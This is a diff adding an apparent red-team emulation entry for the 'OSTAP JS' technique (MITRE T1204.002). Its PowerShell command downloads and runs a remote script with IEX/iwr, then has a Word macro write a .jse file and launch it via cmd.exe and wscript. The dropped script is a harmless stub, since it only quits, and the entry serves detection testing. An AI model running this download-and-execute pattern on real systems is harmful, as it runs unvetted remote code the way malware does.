@@ -1,0 +1,22 @@
+- description: 'Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
+
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1)
+    to load and execute VBA code into Excel or Word documents.
+
+    '
+  id: cbb1eb6f3c773d8e242575fb6d9f53ba
+  name: OSTAP JS version
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: 'IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1");
+          $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write
+          #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe
+          //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"; Invoke-MalDoc
+          -macroCode $macrocode -officeProduct "Word"'
+        payloads: []
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
